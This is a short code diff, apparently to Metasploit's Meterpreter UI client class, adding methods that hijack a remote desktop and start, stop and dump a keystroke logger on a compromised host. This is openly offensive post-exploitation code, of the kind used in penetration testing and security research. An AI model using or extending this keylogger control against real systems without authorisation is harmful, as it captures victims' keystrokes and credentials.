@@ -94,6 +94,42 @@ class UI < Rex::Post::UI
 		return response.get_tlv_value(TLV_TYPE_IDLE_TIME);
 	end
 
+	#
+	# Hijack the input desktop
+	#
+	def grab_desktop
+		request  = Packet.create_request('stdapi_ui_grabdesktop')
+		response = client.send_request(request)
+		return true
+	end
+
+	#
+	# Start the keyboard sniffer
+	#
+	def keyscan_start
+		request  = Packet.create_request('stdapi_ui_start_keyscan')
+		response = client.send_request(request)
+		return true
+	end
+
+	#
+	# Stop the keyboard sniffer
+	#
+	def keyscan_stop
+		request  = Packet.create_request('stdapi_ui_stop_keyscan')
+		response = client.send_request(request)
+		return true
+	end
+
+	#
+	# Dump the keystroke buffer
+	#
+	def keyscan_dump
+		request  = Packet.create_request('stdapi_ui_get_keys')
+		response = client.send_request(request)
+		return response.get_tlv_value(TLV_TYPE_KEYS_DUMP);
+	end
+				
 protected
 	attr_accessor :client # :nodoc:
 
